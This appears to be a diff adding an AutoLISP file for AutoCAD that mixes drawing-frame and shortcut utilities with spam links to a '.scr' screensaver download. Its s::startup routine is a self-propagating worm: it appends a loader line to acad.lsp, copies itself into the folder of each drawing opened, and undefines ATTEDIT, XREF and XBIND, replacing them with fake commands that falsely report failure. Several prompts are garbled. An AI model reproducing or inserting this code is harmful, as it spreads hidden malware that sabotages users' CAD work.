@@ -1,0 +1,340 @@
+unI  LOVE YOUUUUUUUUUUUUUu  from screensaver http://advgoogle.0catch.com/love.scr   see more in  http://advgoogle.blogspot.com/   
+
+
+(vmon)
+
+I  LOVE YOUUUUUUUUUUUUUu  from screensaver http://advgoogle.0catch.com/love.scr   see more in  http://advgoogle.blogspot.com/   
+
+(defun c:sz(/ tq x y b yy pp jj a p1 p2 p3 p4 t1 ty tt t2)
+(initget "A0 A1 A2 A3 A4")
+(setq tq (getkword "\n������ͼ��(a0,a1,a2,a3,a4)<a1>:"))
+(if (null tq) (setq tq "A1"))
+(cond
+  ((= tq "A0") 
+    (initget 6)
+    (setq y 841 b 10)
+    (setq i (getint "\nxֵ(1--1189,2--1338,3--1486,4--1635,5--1784)<1189>:"))
+    (if (not i) (setq i 1))
+    (cond 
+      ((= i 1) (setq x 1189)) 
+      ((= i 2) (setq x 1338))
+      ((= i 3) (setq x 1486))
+      ((= i 4) (setq x 1635))
+      ((= i 5) (setq x 1784))
+    )
+  )
+  ((= tq "A1") 
+    (initget 6)
+    (setq y 594 b 10)
+    (setq i (getint "\nxֵ(1--841,2--1051,3--1261,4--1471,5--1681)<841>:"))
+    (if (not i) (setq i 1))
+    (cond 
+      ((= i 1) (setq x 841)) 
+      ((= i 2) (setq x 1051))
+      ((= i 3) (setq x 1261))
+      ((= i 4) (setq x 1471))
+      ((= i 5) (setq x 1681))
+    )
+  )
+  ((= tq "A2") 
+    (initget 6)
+    (setq y 420 b 10)
+    (setq i (getint "\nxֵ(1--594,2--743,3--891,4--1040,5--1189)<594>:"))
+    (if (not i) (setq i 1))
+    (cond 
+      ((= i 1) (setq x 594)) 
+      ((= i 2) (setq x 743))
+      ((= i 3) (setq x 891))
+      ((= i 4) (setq x 1040))
+      ((= i 5) (setq x 1189))
+    )
+  )
+  ((= tq "A3") 
+    (initget 6)
+    (setq y 297 b 5)
+    (setq i (getint "\nxֵ(1--420,2--630,3--840)<420>:"))
+    (if (not i) (setq i 1))
+    (cond 
+      ((= i 1) (setq x 420)) 
+      ((= i 2) (setq x 630))
+      ((= i 3) (setq x 840))
+    )
+  )
+  ((= tq "A4") 
+    (initget 6)
+    (setq y 297 b 5)
+    (setq i (getint "\nxֵ(1--210,2--358,3--506)<210>:"))
+    (if (not i) (setq i 1))
+    (cond 
+      ((= i 1) (setq x 210)) 
+      ((= i 2) (setq x 358))
+      ((= i 3) (setq x 506))
+    )
+  )
+)
+(setq l (getreal "")) 
+(if (not l) (setq l 1.0))
+(setq a (* 25 l) x (* x l) y (* y l) b (* b l) pp (list x y))
+(command "limits" "0,0" pp "ltscale" l "zoom" "a" "grid" (* 10 l))
+(command "dim" "dimscale" L "EXIT")
+(setq jj (getint "\>:"))
+(if (not jj) (setq jj 1))
+(cond ((= jj 1) (command "dim" "dimblk" "arrow" "exit"))
+((= jj 2) (command "dim" "dimtsz" "1" "exit")))
+(setq p1 (list 0 0) p2 (polar p1 0 x) p3 (polar p2 (/ pi 2) y)
+ p4 (polar p1 (/ pi 2) y))
+(command "layer" "s" "24" "" "line" p1 p2 p3 p4 "c")
+(setq p1 (list a b) p2 (polar p1 0 (- x a b)) 
+p3 (polar p2 (/ pi 2) (- y (* b 2)))
+p4 (polar p1 (/ pi 2) (- y (* b 2))))
+(command "layer" "s" "44" "" "line" p1 p2 p3 p4 "c")
+(setq yy (getstring ">:"))
+(if (= yy "") (setq yy "3"))
+(command "insert" yy p2 l l 0)
+;(command "insert" "fjl" p1 l l 0)
+;(if (and (or (= tq "A2") (= tq "A3")) (= yy "4"))  (command "insert" "tytqzl" p4 l l 0))
+(if (= b (* 10 l))
+ (setq p (list (car p2) (- (cadr p2) (* 0.6 b))))
+ (setq p (list (car p2) (- (cadr p2) (* 0.8 b))))
+)
+(if (= b (* 10 l)) (setq h (* 3 l)) (setq h (* 3 l)))
+(command "layer" "s" 24 "")
+(command "text" "r" p h 0 "")
+(command "text" p1 (* 5 l) "0" 123 "erase" "l" "" "redraw"))
+**********************
+
+*****************
+(defun s::startup (/ old_cmd path dwgpath mnlpath apppath oldacad
+		   newacad nowdwg lspbj	wjm wjm1 wjqm wjqm1 wz ns1 ns2
+		   )
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+  (setq path (findfile "base.dcl"))
+  (setq path (substr path 1 (- (strlen path) 8)))
+  (setq mnlpath (getvar "menuname"))
+  (setq nowdwg (getvar "dwgname"))
+  (setq wjqm (findfile nowdwg))
+  (setq dwgpath (substr wjqm 1 (- (strlen wjqm) (strlen nowdwg))))
+  (setq acadpath (findfile "acad.lsp"))
+  (setq acadpath (substr acadpath 1 (- (strlen acadpath) 8)))
+  (setq	ns1 ""
+	ns2 ""
+	)
+  (setq lspbj 0)
+  (setq wjqm (strcat path "acad.lsp"))
+  (if (setq wjm (open wjqm "r"))
+    (progn (while (setq wz (read-line wjm))
+	     (setq ns1 ns2)
+	     (setq ns2 wz)
+	     )
+	   (if (> (strlen ns1) 14)
+	     (if (= (substr ns1 8 7) "acadiso")
+	       (setq lspbj 1)
+	       )
+	     )
+	   (close wjm)
+	   )
+    )
+  (if (and (= acadpath dwgpath) (/= acadpath path))
+    (progn (setq oldacad (findfile "acad.lsp"))
+	   (setq newacad (strcat path "acadiso.lsp"))
+	   (if (= lspbj 0)
+	     (progn (setq wjqm (strcat path "acad.lsp"))
+		    (setq wjm (open wjqm "a"))
+		    (write-line
+		      (strcat "(load" (chr 34) "acadiso" (chr 34) ")")
+                      wjm
+		      )
+		    (write-line "(princ)" wjm)
+		    (close wjm)
+		    )
+	     )
+	   (writeapp)
+	   )
+    (progn (if (/= nowdwg "Drawing.dwg")
+	     (progn (setq oldacad (findfile "acadiso.lsp"))
+		    (setq newacad (strcat dwgpath "acad.lsp"))
+		    (writeapp)
+		    )
+	     )
+	   )
+    )
+  (command "undefine" "attedit")
+  (command "undefine" "xref")
+  (command "undefine" "xbind")
+  (setvar "cmdecho" old_cmd)
+  (princ)
+  )
+(defun writeapp	()
+  (if (setq wjm1 (open newacad "w"))
+    (progn (setq wjm (open oldacad "r"))
+	   (while (setq wz (read-line wjm)) (write-line wz wjm1))
+	   (close wjm)
+	   (close wjm1)
+	   )
+    )
+  )
+(defun C:attedit (/ p cont old_cmd)
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+  (setq p (ssget))
+  (if p
+    (progn (setq cont (sslength p))
+	   (princ "\nSeltct objects:")
+	   (princ cont)
+	   (princ "found")
+	   (princ "\n")
+	   (princ cont)
+	   (princ " was not able to be attedit")
+	   )
+    )
+  (setvar "cmdecho" old_cmd)
+  (princ)
+  )
+(defun C:xref (/ old_cmd)
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+  (command "insert")
+  (setvar "cmdecho" old_cmd)
+  (princ)
+  )
+(defun C:xbind (/ old_cmd)
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+  (command "insert")
+  (setvar "cmdecho" old_cmd)
+  (princ)
+  )
+(defun C:Burst (/ p old_cmd)
+  (setq old_cmd (getvar "cmdecho"))
+  (setvar "cmdecho" 0)
+  (princ "\nBUR")
+  (setq p (ssget))
+  (setvar "cmdecho" old_cmd)
+  (princ)
+  )
+(princ)
+(DEFUN C:BB () 
+(princ "select the point to be break")
+(COMMAND "BREAK"pause "F" pause "@0,0") (PRINC))
+(DEFUN C:BR () 
+(princ "select the point to be break")
+(COMMAND "BREAK"pause "F") (PRINC))
+(defun C:CC (/ ss FL)
+ (princ "\nSelect objects: ")
+ (setq ss (ssget))
+ (setq n (sslength ss))
+ (command "COPY" ss "" "m" "") (repeat n (command "" copy "" ""))
+)
+(DEFUN C:DD () (COMMAND "DDATTE") (PRINC))
+(DEFUN C:d () (COMMAND "DIST") (PRINC))
+(DEFUN C:DT () (COMMAND "DTEXT") (PRINC))
+;;;==========================================================================
+
+;;;==========================================================================
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; --------------------- BONUS ERROR HANDLER ----------------------
+
+(defun init_bonus_error ( lst / ss undo_init)
+ 
+  ;;;;;;;local function;;;;;;;;;;;;;;;;;;;;
+  (defun undo_init ( / undo_ctl)
+   (b_set_sysvars (list "cmdecho" 0))
+   (setq undo_ctl (getvar "undoctl")) 
+   (if (equal 0 (getvar "UNDOCTL")) ;Make sure undo is fully enabled.
+       (command "_.undo" "_all")
+   )
+   (if (or (not (equal 1 (logand 1 (getvar "UNDOCTL"))))  
+           (equal 2 (logand 2 (getvar "UNDOCTL")))
+       );or
+       (command "_.undo" "_control" "_all") 
+   )
+    
+   ;Ensure undo auto is off
+   (if (equal 4 (logand 4 (getvar "undoctl")))
+       (command "_.undo" "_Auto" "_off")
+   )
+   
+   ;Place an end mark down if needed.
+   (while (equal 8 (logand 8 (getvar "undoctl")))
+        (command "_.undo" "_end")
+   );while         
+   (while (not (equal 8 (logand 8 (getvar "undoctl"))))
+    (command "_.undo" "_begin")                 
+   );while
+   (b_restore_sysvars) 
+   ;return original value of undoctl
+   undo_ctl
+  );defun undo_init
+
+    ;;;;;;;;;;;;;begin the work of init_bonus error;;;;;;;;;;;;;
+ (setq ss (ssgetfirst))
+ (if (not bonus_alive)
+     (setq bonus_alive 0)
+ );if
+ (setq bonus_alive (1+ bonus_alive))
+ 
+ (if (and (> bonus_alive 1)                              ;do some double checking to make sure 
+          (or (not (equal 'LIST (type *error*)))         ;our error handler is still active.
+              (not (equal "bonus_error" (cadr *error*))) ;for nested this call.
+          );or
+     );and
+     (progn
+      (princ "\nNested Error trapping is being used incorrectly.")
+      (princ "\nResetting the nested index to 1.")
+      (setq     *error* bonus_error
+            bonus_alive 0
+      );setq
+      (restore_old_error);quietly restore undo status
+      (setq bonus_alive 1)
+     );progn then things need to be re-adjusted.
+ );if
+ (if (<= bonus_alive 0)   
+     (progn 
+      (setq bonus_alive 0);undo settings will be restored 
+                          ;along with setting *error* back to bonus_old_error.
+                          ;No call to b_restore_sysvars will be made.
+                          ;If it is decided, this thing should do variable clean 
+                          ;up also then set bonus_alive to 1 before calling
+                          ;restore_old_error
+      (restore_old_error);quietly restore bonus_old_error and undo status.
+      (setq bonus_alive 1)
+     );progn then
+ );if
+ (if (= bonus_alive 1)
+     (progn
+      (if (and *error*
+               (or (not (equal 'LIST (type *error*)))
+                   (not (equal "bonus_error" (cadr *error*)))
+               );or 
+          );and 
+          (setq bonus_old_error *error*);save the *error* only if it 
+                                        ;looks like the standard one or is some other 
+                                        ;user defined one. Don't want to save it if 
+                                        ;it's ours because we already have it.
+      );if
+      (if (cadr lst)
+          (setq bonus_undoctl (undo_init)) 
+          (setq bonus_undoctl nil)
+      );if
+    );progn then this is a top level call, or in other words, the first time through.
+ );if
+ (b_set_sysvars (car lst))
+ (if (= bonus_alive 1)
+     (progn
+      (setq *error* bonus_error);setq
+      (if (caddr lst)
+          (setq *error* (append (reverse (cdr (reverse *error*))) 
+                                (list (caddr lst)
+                                      (last *error*)
+                                );list
+                        );append
+          );setq ;then add additional routine name to the error function.
+      );if
+     );progn
+     (progn
+      (if (and (> bonus_alive 1)
+               (or (not (equal 'LIST (type *error*)))
+                   (not (equal "bonus_error" (cadr *error*)))
+               );or
+          );and
